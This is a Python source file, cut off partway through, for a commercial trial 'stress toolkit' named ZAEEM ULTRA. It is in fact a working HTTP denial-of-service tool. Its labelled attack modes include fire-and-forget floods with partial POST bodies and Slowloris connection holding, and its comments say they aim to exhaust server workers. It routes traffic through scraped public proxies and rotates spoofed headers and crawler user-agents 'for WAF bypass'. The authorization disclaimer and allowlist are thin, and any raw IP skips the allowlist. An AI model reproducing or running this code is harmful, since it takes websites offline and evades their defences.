#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
if sys.version_info < (3, 8):
    print("[!] Python 3.8 or higher is required.")
    sys.exit(1)

import asyncio
import aiohttp
import time
import ssl
import os
import json
import random
import socket
import threading
import statistics
import string
import re
import ipaddress
from pathlib import Path
from urllib.parse import urlparse, urlencode, urljoin
from datetime import datetime
from collections import deque
from typing import Optional, List, Dict, Tuple

try:
    from aiohttp import ClientSession, TCPConnector, ClientTimeout
except ImportError:
    print("[!] aiohttp not installed.  Run:  pip install aiohttp")
    sys.exit(1)

# ======================================================================
#  Optional: uvloop (Linux speed boost) + aiohttp-socks (SOCKS proxies)
# ======================================================================
try:
    import uvloop
    uvloop.install()
except ImportError:
    uvloop = None

try:
    from aiohttp_socks import ProxyConnector as SocksConnector
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

# ======================================================================
#  Constants
# ======================================================================
VERSION    = "5.0"
TOOL_NAME  = "ZAEEM ULTRA"
CONTACT    = "@ZAEEM_S1"
TRIAL_DAYS = 3
PROXY_TTL  = 3600

PROXY_FILE   = Path.home() / ".zaeem_proxies.json"
ALLOWED_FILE = Path.home() / ".zaeem_allowed.txt"
STATE_FILE   = Path.home() / ".zaeem_state"
RESULTS_DIR  = Path.home() / ".zaeem_results"

DEFAULT_CONC  = 400
DEFAULT_TOTAL = 5000
DEFAULT_TOUT  = 6.0
WARN_MS       = 600
DEG_5XX       = 0.10
DEG_P95_MS    = 1200
PROXY_TEST_TOUT = 5.0
PROXY_PARALLEL  = 80

# ======================================================================
#  Attack modes
# ======================================================================
MODE_STRESS    = "STRESS"    # Full HTTP exchange, read response body
MODE_FLOOD     = "FLOOD"     # Fire-and-forget: send request, don't read body
MODE_SLOW      = "SLOWLORIS" # Hold connections open with partial headers
MODE_MIXED     = "MIXED"     # Rotate between STRESS and FLOOD randomly

MODES = [MODE_STRESS, MODE_FLOOD, MODE_MIXED, MODE_SLOW]

# ======================================================================
#  User-Agent Pool (40 entries)
# ======================================================================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "okhttp/4.12.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UD1A.231105.004)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014)",
    "python-requests/2.31.0",
    "python-requests/2.28.2",
    "Go-http-client/1.1",
    "Go-http-client/2.0",
    "curl/8.4.0",
    "curl/7.88.1",
    "Apache-HttpClient/4.5.14 (Java/17.0.9)",
    "Java/17.0.9",
    "PostmanRuntime/7.37.0",
    "insomnia/9.2.0",
    "axios/1.6.7",
    "node-fetch/2.7.0",
    "aiohttp/3.9.3",
    "GuzzleHttp/7.8.1",
    "libwww-perl/6.72",
    "Wget/1.21.4",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
]

# ======================================================================
#  Referer pool for WAF bypass
# ======================================================================
REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://t.co/",
    "https://www.reddit.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.youtube.com/",
    "https://www.wikipedia.org/",
]

# ======================================================================
#  Proxy Sources (12 public lists)
# ======================================================================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
]

# ======================================================================
#  Colors
# ======================================================================
class Color:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    PURPLE = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    DIM    = "\033[90m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def paint(text, *codes):
    return "".join(codes) + str(text) + Color.RESET

def div(char="=", width=70, color=Color.CYAN):
    return paint(char * width, color)

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def ts():
    return datetime.now().strftime("%H:%M:%S")

# ======================================================================
#  Banner
# ======================================================================
BANNER = (
    paint(r"""
 ______  ______  ______  ______  __    __
/\___  \/\  __ \/\  ___\/\  ___\/\ "-./  \
\/_/  /_\ \  __ \ \  __\\ \  __\\ \ \-./\ \
  /\_____\ \_\ \_\ \_____\ \_____\ \_\ \ \_\
  \/_____/\/_/\/_/\/_____/\/_____/\/_/  \/_/
""", Color.RED)
    + paint(f"\n   ULTRA STRESS TOOLKIT {VERSION}  |  {CONTACT}\n",
            Color.YELLOW, Color.BOLD)
)

DISCLAIMER = (
    "\n"
    "  This tool is for AUTHORIZED performance testing only.\n"
    "  Use ONLY on systems you own or have explicit written permission to test.\n"
    f"  Contact: {CONTACT}\n"
    "\n"
    "  Type  I AGREE  to continue.\n"
)

# ======================================================================
#  Trial
# ======================================================================
def _load_trial():
    try:
        raw = STATE_FILE.read_text("utf-8").strip()
        return int(raw) if raw.isdigit() else None
    except Exception:
        return None

def _save_trial(t):
    try:
        STATE_FILE.write_text(str(int(t)), "utf-8")
    except Exception:
        pass

def enforce_trial():
    now_ = int(time.time())
    start = _load_trial()
    if start is None:
        _save_trial(now_)
        start = now_
    if (now_ - start) > TRIAL_DAYS * 86400:
        clr()
        print(BANNER)
        print(div())
        print(paint("  TRIAL EXPIRED.", Color.RED, Color.BOLD))
        print(paint(f"  Contact: {CONTACT}", Color.YELLOW))
        print(div())
        sys.exit(1)

# ======================================================================
#  Allowlist
# ======================================================================
def load_allowed():
    try:
        return {
            ln.strip().lower()
            for ln in ALLOWED_FILE.read_text("utf-8").splitlines()
            if ln.strip() and not ln.startswith("#")
        }
    except Exception:
        return set()

def save_allowed(hosts):
    try:
        ALLOWED_FILE.write_text("\n".join(sorted(hosts)), "utf-8")
    except Exception:
        pass

def add_allowed(raw):
    raw = re.sub(r"^https?://", "", raw.strip().lower()).strip("/").split("/")[0].split(":")[0]
    if not raw or " " in raw or len(raw) < 3:
        return False
    h = load_allowed()
    h.add(raw)
    save_allowed(h)
    return True

def is_ip(s):
    try:
        ipaddress.ip_address(s.split(":")[0])
        return True
    except ValueError:
        return False

def normalize_url(raw):
    raw = raw.strip()
    if raw and not re.match(r"^https?://", raw, re.I):
        raw = "http://" + raw
    return raw.rstrip("/")

def resolve_ip(url):
    try:
        host = urlparse(url).hostname or ""
        return socket.gethostbyname(host) if host else "n/a"
    except Exception:
        return "n/a"

def validate_target(url):
    u = urlparse(url)
    if u.scheme not in ("http", "https"):
        return False, "URL must start with http:// or https://"
    host = (u.hostname or "").lower()
    if not host:
        return False, "Invalid host."
    if is_ip(host):
        return True, ""
    allowed = load_allowed()
    if not allowed:
        return False, "No authorized domains. Add one from menu [A]."
    bare = host.lstrip("www.")
    for a in allowed:
        if host == a or host.endswith("." + a) or bare == a:
            return True, ""
    return False, f"'{host}' not in allowlist.\nAllowed: {', '.join(sorted(allowed))}"

# ======================================================================
#  Proxy Engine  (pre-validation + bad-removal + fallback)
# ======================================================================
class ProxyEngine:

    def __init__(self):
        self._raw: List[str]    = []   # all fetched (ip:port)
        self._good: List[str]   = []   # pre-validated only
        self._bad: set          = set()
        self._idx: int          = 0
        self._lock              = threading.Lock()
        self.fetched_at: float  = 0.0
        self.validated: bool    = False

    # ---- fetch sources -----------------------------------------------
    @staticmethod
    async def _fetch_one(session, url):
        found = []
        try:
            async with session.get(url, timeout=ClientTimeout(total=12)) as r:
                if r.status == 200:
                    for line in (await r.text(errors="ignore")).splitlines():
                        line = re.sub(r"^https?://", "", line.strip()).strip("/")
                        parts = line.split(":")
                        if len(parts) == 2:
                            try:
                                int(parts[1])
                                found.append(line)
                            except ValueError:
                                pass
        except Exception:
            pass
        return found

    async def _fetch_all(self):
        raw = set()
        conn = TCPConnector(limit=50, ssl=False)
        try:
            async with ClientSession(connector=conn) as s:
                results = await asyncio.gather(
                    *[self._fetch_one(s, u) for u in PROXY_SOURCES],
                    return_exceptions=True,
                )
                for r in results:
                    if isinstance(r, list):
                        raw.update(r)
        except Exception:
            pass
        finally:
            try:
                if not conn.closed:
                    await conn.close()
            except Exception:
                pass
        lst = list(raw)
        random.shuffle(lst)
        return lst

    # ---- pre-validate a single proxy ----------------------------------
    @staticmethod
    async def _test_proxy(session, proxy_url, test_url, timeout):
        try:
            async with session.get(
                test_url, proxy=proxy_url,
                timeout=ClientTimeout(total=timeout),
                allow_redirects=False,
            ) as r:
                return r.status < 600
        except Exception:
            return False

    async def _validate_batch(self, proxies, test_url, max_ok=400):
        good   = []
        sem    = asyncio.Semaphore(PROXY_PARALLEL)
        conn   = TCPConnector(limit=0, ssl=False)
        lock   = asyncio.Lock()
        done   = {"n": 0}

        async def check(p):
            async with sem:
                if done["n"] >= max_ok:
                    return
                ok = await self._test_proxy(session, f"http://{p}", test_url, PROXY_TEST_TOUT)
                async with lock:
                    done["n"] += 1
                    if ok and done["n"] <= max_ok:
                        good.append(p)
                sys.stdout.write(
                    paint(f"\r  Validating proxies...  ok={len(good)}  tested={done['n']}/{len(proxies)}  ", Color.DIM)
                )
                sys.stdout.flush()

        async with ClientSession(connector=conn) as session:
            await asyncio.gather(*[check(p) for p in proxies], return_exceptions=True)

        print()
        return good

    def _run(self, coro):
        try:
            return asyncio.run(coro)
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(coro)

    # ---- public API ---------------------------------------------------
    def fetch(self, cb=None):
        if cb:
            cb(paint(f"  [{ts()}] Fetching from {len(PROXY_SOURCES)} sources...", Color.YELLOW))
        lst = self._run(self._fetch_all())
        with self._lock:
            self._raw       = lst
            self._good      = lst[:]
            self._bad       = set()
            self._idx       = 0
            self.fetched_at = time.time()
            self.validated  = False
        self._persist()
        if cb:
            cb(paint(f"  [{ts()}] Fetched {len(lst)} proxies (not yet validated).", Color.GREEN))
        return len(lst)

    def validate(self, test_url, cb=None, max_ok=400):
        if cb:
            cb(paint(f"  [{ts()}] Validating up to {max_ok} proxies against {test_url} ...", Color.YELLOW))
        with self._lock:
            raw = self._raw[:]
        good = self._run(self._validate_batch(raw, test_url, max_ok))
        with self._lock:
            self._good     = good
            self._bad      = set()
            self._idx      = 0
            self.validated = True
        self._persist()
        if cb:
            cb(paint(f"  [{ts()}] Validation done: {len(good)} working proxies.", Color.GREEN))
        return len(good)

    def reset_and_fetch(self, cb=None):
        with self._lock:
            self._raw = []; self._good = []; self._bad = set()
            self._idx = 0; self.fetched_at = 0.0; self.validated = False
        try:
            if PROXY_FILE.exists():
                PROXY_FILE.unlink()
        except Exception:
            pass
        self.fetch(cb)

    def load_or_fetch(self, cb=None):
        if PROXY_FILE.exists():
            try:
                data = json.loads(PROXY_FILE.read_text("utf-8"))
                age  = time.time() - float(data.get("fetched_at", 0))
                lst  = data.get("proxies", [])
                if age < PROXY_TTL and lst:
                    with self._lock:
                        self._raw       = lst
                        self._good      = data.get("good", lst[:])
                        self.fetched_at = data["fetched_at"]
                        self.validated  = data.get("validated", False)
                    if cb:
                        cb(paint(f"  [{ts()}] Loaded {len(lst)} proxies from cache.", Color.GREEN))
                    return
            except Exception:
                pass
        self.fetch(cb)

    def _persist(self):
        try:
            PROXY_FILE.write_text(json.dumps({
                "fetched_at": self.fetched_at,
                "proxies"   : self._raw,
                "good"      : self._good,
                "validated" : self.validated,
            }), "utf-8")
        except Exception:
            pass

    def next(self, fallback_direct=False):
        with self._lock:
            pool  = [p for p in self._good if p not in self._bad]
            if not pool:
                pool = [p for p in self._raw if p not in self._bad]
            if not pool:
                return None
            p = pool[self._idx % len(pool)]
            self._idx += 1
            return f"http://{p}"

    def mark_bad(self, proxy_url):
        with self._lock:
            raw = re.sub(r"^https?://", "", proxy_url)
            self._bad.add(raw)
            # also remove from good list
            self._good = [p for p in self._good if p != raw]

    def count(self):
        with self._lock:
            pool = [p for p in self._good if p not in self._bad]
            return len(pool)

    def raw_count(self):
        with self._lock:
            return len(self._raw)

    def summary(self):
        with self._lock:
            raw  = len(self._raw)
            good = len([p for p in self._good if p not in self._bad])
            val  = " (validated)" if self.validated else ""
            return f"Proxies: {good} active{val} / {raw} total"


PROXY = ProxyEngine()

# ======================================================================
#  Payload helpers
# ======================================================================
def rand_str(n=12):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

def rand_qs():
    k = random.randint(2, 6)
    return "?" + "&".join(f"{rand_str(random.randint(4,8))}={rand_str(random.randint(6,16))}" for _ in range(k))

def rand_post():
    return urlencode({rand_str(8): rand_str(16) for _ in range(random.randint(4, 10))})

def rand_xff():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def rand_referer(target_url):
    base   = random.choice(REFERERS)
    parsed = urlparse(target_url)
    kw     = parsed.hostname or rand_str(8)
    return base + kw.replace(".", "+")

def rand_cookie():
    keys = ["session", "token", "uid", "sid", "auth", "csrf", "track"]
    return "; ".join(f"{k}={rand_str(16)}" for k in random.sample(keys, random.randint(2, 4)))

def build_headers(target_url, method):
    h = {
        "User-Agent"      : random.choice(UA_POOL),
        "Accept"          : random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,*/*;q=0.8",
            "application/json, text/plain, */*",
            "*/*",
        ]),
        "Accept-Language" : random.choice([
            "en-US,en;q=0.9",
            "en-GB,en;q=0.8",
            "en-US,en;q=0.5",
            "ar,en;q=0.8",
        ]),
        "Accept-Encoding" : "gzip, deflate, br",
        "Connection"      : random.choice(["keep-alive", "keep-alive", "keep-alive", "close"]),
        "Cache-Control"   : random.choice(["no-cache", "no-store, no-cache", "max-age=0"]),
        "Pragma"          : "no-cache",
        "X-Forwarded-For" : rand_xff(),
        "X-Real-IP"       : rand_xff(),
        "X-Originating-IP": rand_xff(),
        "Via"             : f"1.1 {rand_str(8)}",
        "Referer"         : rand_referer(target_url),
        "Cookie"          : rand_cookie(),
    }
    if method == "POST":
        h["Content-Type"] = random.choice([
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "application/json",
        ])
    if random.random() < 0.4:
        h["Upgrade-Insecure-Requests"] = "1"
    if random.random() < 0.3:
        h["DNT"] = "1"
    return h

# ======================================================================
#  Stats
# ======================================================================
class Stats:
    def __init__(self, total):
        self.total     = total
        self.ok        = 0
        self.fail      = 0
        self.retried   = 0
        self.lat       = deque(maxlen=10000)
        self.codes     = {}
        self.errors    = {}
        self._lock     = threading.Lock()
        self.t0        = time.perf_counter()

    def hit(self, ms, code):
        with self._lock:
            self.ok += 1
            self.lat.append(ms)
            self.codes[code] = self.codes.get(code, 0) + 1

    def miss(self, name):
        with self._lock:
            self.fail += 1
            self.errors[name] = self.errors.get(name, 0) + 1

    def add_retry(self):
        with self._lock:
            self.retried += 1

    def sent(self):
        return self.ok + self.fail

    def rps(self):
        e = time.perf_counter() - self.t0
        return self.sent() / e if e > 0 else 0.0

    def pct(self, p):
        lat = sorted(self.lat)
        if not lat:
            return 0.0
        k = max(0, int(round((p / 100) * (len(lat) - 1))))
        return lat[k]

    def avg(self):
        lat = list(self.lat)
        return statistics.mean(lat) if lat else 0.0

    def error_rate(self):
        s = self.sent()
        return self.fail / s if s else 0.0

# ======================================================================
#  STRESS worker  (full request, read body)
# ======================================================================
async def worker_stress(session, url, method, sem, stats, timeout,
                        use_proxy, rand_path, verbose, max_retries=1):
    async with sem:
        target = url + (rand_qs() if rand_path else "")
        data   = rand_post() if method == "POST" else None
        proxy  = PROXY.next() if use_proxy else None

        for attempt in range(max_retries + 1):
            if attempt > 0:
                stats.add_retry()
                proxy = PROXY.next() if use_proxy else None

            t0 = time.perf_counter()
            try:
                async with session.request(
                    method, target,
                    headers=build_headers(url, method),
                    data=data, proxy=proxy,
                    timeout=timeout,
                    allow_redirects=True, max_redirects=5,
                ) as resp:
                    await resp.read()
                    ms = (time.perf_counter() - t0) * 1000.0
                    stats.hit(ms, resp.status)
                    if verbose:
                        col = Color.RED if resp.status >= 500 else (
                              Color.YELLOW if resp.status >= 400 or ms >= WARN_MS
                              else Color.GREEN)
                        print(paint(f"  [{ts()}] {resp.status}  {ms:7.1f}ms", col))
                    return

            except asyncio.TimeoutError:
                if attempt < max_retries:
                    continue
                stats.miss("TimeoutError")
                return

            except (aiohttp.ClientProxyConnectionError,
                    aiohttp.ClientHttpProxyError,
                    aiohttp.ClientConnectorError) as e:
                if proxy:
                    PROXY.mark_bad(proxy)
                if attempt < max_retries:
                    proxy = None   # fallback: retry direct
                    continue
                name = "ProxyError" if "roxy" in type(e).__name__ else "ConnectError"
                stats.miss(name)
                return

            except aiohttp.ServerDisconnectedError:
                stats.hit(0.0, 503)
                return

            except Exception as e:
                stats.miss(type(e).__name__)
                return

# ======================================================================
#  FLOOD worker  (fire-and-forget: send request, close without reading)
#   Maximises worker exhaustion on the target (connections stay open on
#   the server side while we immediately move on).
# ======================================================================
async def worker_flood(url, method, sem, stats, tout_connect, use_proxy,
                       rand_path, verbose, ssl_ctx):
    async with sem:
        target = url + (rand_qs() if rand_path else "")
        proxy  = PROXY.next() if use_proxy else None
        parsed = urlparse(target)
        host   = parsed.hostname or ""
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
        path   = (parsed.path or "/") + ("?" + parsed.query if parsed.query else "")

        t0 = time.perf_counter()
        try:
            # Raw TCP: open connection, send HTTP request headers, abandon
            r, w = await asyncio.wait_for(
                asyncio.open_connection(
                    host, port,
                    ssl=ssl_ctx if parsed.scheme == "https" else None,
                ),
                timeout=tout_connect,
            )
            hdrs = build_headers(url, method)
            req  = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
                + "\r\n"
            )
            if method == "POST":
                body = rand_post()
                req  = req[:-2] + f"Content-Length: {len(body)}\r\n\r\n"
                w.write(req.encode("utf-8", errors="replace"))
                # Send part of body only (exhaust server read buffer)
                partial = body[:random.randint(4, 32)]
                w.write(partial.encode("utf-8", errors="replace"))
            else:
                w.write(req.encode("utf-8", errors="replace"))

            await w.drain()
            ms = (time.perf_counter() - t0) * 1000.0
            # Mark as "connection established" success
            stats.hit(ms, 200)
            try:
                w.close()
            except Exception:
                pass
            if verbose:
                print(paint(f"  [{ts()}] FLOOD  connected  {ms:6.1f}ms", Color.CYAN))

        except asyncio.TimeoutError:
            stats.miss("FloodTimeout")
        except ConnectionRefusedError:
            stats.miss("ConnRefused")
        except Exception as e:
            stats.miss(f"Flood:{type(e).__name__}")

# ======================================================================
#  SLOWLORIS worker  (hold connection open with slow header sends)
#   Each worker opens a connection and sends incomplete HTTP headers
#   slowly, keeping the server's connection slot occupied.
# ======================================================================
async def worker_slow(url, sem, stats, hold_sec, use_proxy, verbose, ssl_ctx):
    async with sem:
        parsed = urlparse(url)
        host   = parsed.hostname or ""
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)

        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(
                    host, port,
                    ssl=ssl_ctx if parsed.scheme == "https" else None,
                ),
                timeout=10.0,
            )
            # Send partial GET headers (no final \r\n to complete the request)
            partial_req = (
                f"GET /{rand_str(8)}?{rand_str(6)}={rand_str(12)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"X-Forwarded-For: {rand_xff()}\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
            )
            w.write(partial_req.encode("utf-8"))
            await w.drain()
            stats.hit(0.0, 200)   # connection held = success

            # Keep the connection alive with extra header lines every few seconds
            deadline = time.perf_counter() + hold_sec
            while time.perf_counter() < deadline:
                await asyncio.sleep(random.uniform(3, 8))
                try:
                    # Send another partial header to keep socket alive
                    w.write(f"X-{rand_str(8)}: {rand_str(16)}\r\n".encode())
                    await w.drain()
                except Exception:
                    break

            try:
                w.close()
            except Exception:
                pass

            if verbose:
                print(paint(f"  [{ts()}] SLOWLORIS held {hold_sec}s", Color.PURPLE))

        except asyncio.TimeoutError:
            stats.miss("SlowTimeout")
        except ConnectionRefusedError:
            stats.miss("ConnRefused")
        except Exception as e:
            stats.miss(f"Slow:{type(e).__name__}")

# ======================================================================
#  Progress bar
# ======================================================================
async def show_progress(tasks, stats, mode):
    W = 34
    while True:
        done   = sum(1 for t in tasks if t.done())
        frac   = done / stats.total if stats.total else 1.0
        filled = int(frac * W)
        bar    = "#" * filled + "-" * (W - filled)
        mode_s = paint(f"[{mode}]", Color.PURPLE)
        line   = (
            paint(f"\r  [{ts()}] ", Color.DIM)
            + mode_s + " "
            + paint(f"[{bar}]", Color.CYAN)
            + paint(f" {done}/{stats.total}", Color.WHITE)
            + paint(f"  rps={stats.rps():6.1f}", Color.GREEN)
            + paint(f"  avg={stats.avg():5.0f}ms", Color.YELLOW)
            + paint(f"  ok={stats.ok}", Color.GREEN)
            + paint(f"  fail={stats.fail}", Color.RED)
        )
        sys.stdout.write(line)
        sys.stdout.flush()
        if done >= stats.total:
            break
        await asyncio.sleep(0.1)
    print()

# ======================================================================
#  Engine
# ======================================================================
async def engine(url, method, concurrency, total, timeout_s,
                 verify_tls, use_proxy, rand_path, verbose,
                 mode=MODE_STRESS, hold_sec=30, max_retries=1):

    sem     = asyncio.Semaphore(concurrency)
    stats   = Stats(total)
    ssl_ctx = None

    if urlparse(url).scheme == "https":
        ssl_ctx = ssl.create_default_context()
        if not verify_tls:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = ssl.CERT_NONE

    tasks = []

    if mode == MODE_SLOW:
        # Slowloris: launch total workers, each holds for hold_sec
        task_coros = [
            worker_slow(url, sem, stats, hold_sec, use_proxy, verbose, ssl_ctx)
            for _ in range(total)
        ]
        tasks = [asyncio.create_task(c) for c in task_coros]

    elif mode == MODE_FLOOD:
        tout_connect = min(timeout_s, 5.0)
        tasks = [
            asyncio.create_task(
                worker_flood(url, method, sem, stats, tout_connect,
                             use_proxy, rand_path, verbose, ssl_ctx)
            )
            for _ in range(total)
        ]

    else:
        # STRESS or MIXED
        conn = TCPConnector(
            ssl=ssl_ctx, limit=0, limit_per_host=0,
            ttl_dns_cache=300, use_dns_cache=True,
            enable_cleanup_closed=True, keepalive_timeout=30,
        )
        to = ClientTimeout(
            total=timeout_s,
            connect=min(5.0, timeout_s * 0.4),
            sock_read=timeout_s,
        )
        async with ClientSession(connector=conn,
                                 skip_auto_headers=["User-Agent"]) as session:
            if mode == MODE_MIXED:
                # Half STRESS, half FLOOD
                half = total // 2
                tasks = [
                    asyncio.create_task(
                        worker_stress(session, url, method, sem, stats, to,
                                      use_proxy, rand_path, verbose, max_retries)
                    )
                    for _ in range(half)
                ] + [
                    asyncio.create_task(
                        worker_flood(url, method, sem, stats,
                                     min(5.0, timeout_s * 0.4),
                                     use_proxy, rand_path, verbose, ssl_ctx)
                    )
                    for _ in range(total - half)
                ]
            else:
                tasks = [
                    asyncio.create_task(
                        worker_stress(session, url, method, sem, stats, to,
                                      use_proxy, rand_path, verbose, max_retries)
                    )
                    for _ in range(total)
                ]

            if verbose:
                await asyncio.gather(*tasks, return_exceptions=True)
            else:
                await asyncio.gather(
                    asyncio.create_task(show_progress(tasks, stats, mode)),
                    asyncio.gather(*tasks, return_exceptions=True),
                )
            return stats

    # For FLOOD / SLOW (outside the session context)
    if verbose:
        await asyncio.gather(*tasks, return_exceptions=True)
    else:
        await asyncio.gather(
            asyncio.create_task(show_progress(tasks, stats, mode)),
            asyncio.gather(*tasks, return_exceptions=True),
        )
    return stats

# ======================================================================
#  Health check
# ======================================================================
async def health_check(url, timeout_s, verify_tls):
    ssl_ctx = None
    if urlparse(url).scheme == "https":
        ssl_ctx = ssl.create_default_context()
        if not verify_tls:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = ssl.CERT_NONE
    try:
        to  = ClientTimeout(total=timeout_s)
        con = TCPConnector(ssl=ssl_ctx, limit=4)
        async with ClientSession(connector=con) as s:
            t0 = time.perf_counter()
            async with s.get(url, timeout=to, allow_redirects=True) as r:
                await r.read()
                ms = (time.perf_counter() - t0) * 1000.0
                return {"up": True, "status": r.status, "ms": round(ms, 1), "err": None}
    except Exception as e:
        return {"up": False, "status": None, "ms": None, "err": f"{type(e).__name__}: {e}"}

# ======================================================================
#  Save results
# ======================================================================
def save_result(url, dt, stats, rps, hc, mode):
    try:
        RESULTS_DIR.mkdir(exist_ok=True)
        fname = RESULTS_DIR / f"result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        fname.write_text(json.dumps({
            "url": url, "mode": mode, "duration_s": round(dt, 2),
            "sent": stats.sent(), "ok": stats.ok, "fail": stats.fail,
            "retried": stats.retried, "rps": round(rps, 1),
            "latency": {
                "avg": round(stats.avg(), 1), "p50": round(stats.pct(50), 1),
                "p95": round(stats.pct(95), 1), "p99": round(stats.pct(99), 1),
            },
            "codes": stats.codes, "errors": stats.errors,
            "health_after": hc, "timestamp": datetime.now().isoformat(),
        }, indent=2), "utf-8")
    except Exception:
        pass

# ======================================================================
#  Results screen
# ======================================================================
def print_results(url, dt, stats, method, used_proxy, verify_tls, mode):
    clr()
    sent = stats.sent()
    rps  = sent / dt if dt > 0 else 0.0
    ip   = resolve_ip(url)

    print(div())
    print(paint(f"  TEST COMPLETE  --  {TOOL_NAME} {VERSION}", Color.BOLD, Color.GREEN))
    print(div())
    print(paint(f"  Target   : {url}", Color.CYAN))
    print(paint(f"  IP       : {ip}", Color.DIM))
    print(paint(f"  Mode     : {mode}", Color.PURPLE))
    print(paint(f"  Method   : {method}", Color.CYAN))
    print(paint(f"  Proxy    : {'enabled (' + str(PROXY.count()) + ')' if used_proxy else 'direct'}", Color.CYAN))
    print(paint(f"  Duration : {dt:.2f}s", Color.CYAN))
    print(div("-", 70, Color.DIM))

    ok_p   = stats.ok   / sent * 100 if sent else 0.0
    fail_p = stats.fail / sent * 100 if sent else 0.0
    print(paint(f"  Total    : {sent}", Color.WHITE))
    print(paint(f"  Success  : {stats.ok}  ({ok_p:.1f}%)", Color.GREEN))
    print(paint(f"  Failed   : {stats.fail}  ({fail_p:.1f}%)", Color.RED))
    if stats.retried:
